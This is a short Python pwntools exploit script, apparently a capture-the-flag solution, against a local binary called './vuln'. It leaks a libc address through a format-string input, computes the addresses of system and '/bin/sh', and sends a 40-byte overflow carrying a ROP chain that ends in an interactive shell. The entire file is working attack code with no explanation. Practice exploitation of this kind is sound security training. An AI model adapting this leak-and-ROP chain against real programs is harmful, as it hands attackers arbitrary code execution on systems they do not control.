#!/usr/bin/env python3
from pwn import *

p = process('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./vuln')

p.recvuntil(b"What do you want? ")

# Leak libc
p.sendline(b'%17$p')
response = p.recvline()
leak = int(response.split(b' ')[-1].strip(), 16)
log.info(f"Leaked address: {hex(leak)}")

# Calculate addresses
libc_base = leak - 0x29ca8
log.info(f"Libc base address: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x2a145 
ret  = 0x0000000000401016

log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")
log.info(f"pop rdi: {hex(pop_rdi)}")

p.recvuntil(b"Wanna Cry about that? ")


offset = 40  

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret)  # Stack alignment
payload += p64(system_addr)

p.sendline(payload)
p.interactive()